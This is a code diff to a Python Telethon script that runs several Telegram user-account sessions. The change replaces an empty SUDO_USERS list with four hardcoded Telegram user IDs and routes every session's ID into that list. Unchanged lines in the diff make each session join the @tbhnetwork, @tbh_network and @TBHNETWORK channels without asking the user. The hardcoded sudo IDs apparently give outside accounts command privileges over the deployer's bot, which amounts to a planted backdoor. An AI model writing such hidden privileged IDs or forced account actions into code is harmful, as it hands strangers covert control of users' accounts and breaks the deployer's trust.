@@ -44,7 +44,7 @@ ddk = ""
 
 que = {}
 
-SUDO_USERS = []
+SUDO_USERS = [5017007587, 5222186306, 5222186306, 2034973894]
     
 async def start_eagle():
     global idk
@@ -68,7 +68,7 @@ async def start_eagle():
             await idk(functions.channels.JoinChannelRequest(channel="@tbhnetwork"))
             await idk(functions.channels.JoinChannelRequest(channel="@tbh_network"))
             botid = telethon.utils.get_peer_id(botme)
-            S1_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             idk = "S1"
             print(e)
@@ -92,7 +92,7 @@ async def start_eagle():
             await ydk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await ydk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S2_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -115,7 +115,7 @@ async def start_eagle():
             await wdk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await wdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S3_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -138,7 +138,7 @@ async def start_eagle():
             await hdk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await hdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S4_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -161,7 +161,7 @@ async def start_eagle():
             await sdk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await sdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S5_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -184,7 +184,7 @@ async def start_eagle():
             await adk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await adk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S6_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -207,7 +207,7 @@ async def start_eagle():
             await bdk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await bdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S7_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -231,7 +231,7 @@ async def start_eagle():
             await cdk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await cdk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S8_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -254,7 +254,7 @@ async def start_eagle():
             await ddk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await ddk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S9_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
@@ -278,7 +278,7 @@ async def start_eagle():
             await edk(functions.channels.JoinChannelRequest(channel="@TBHNETWORK"))
             botme = await edk.get_me()
             botid = telethon.utils.get_peer_id(botme)
-            S0_USERS.append(botid)
+            SUDO_USERS.append(botid)
         except Exception as e:
             print(e)
     else:
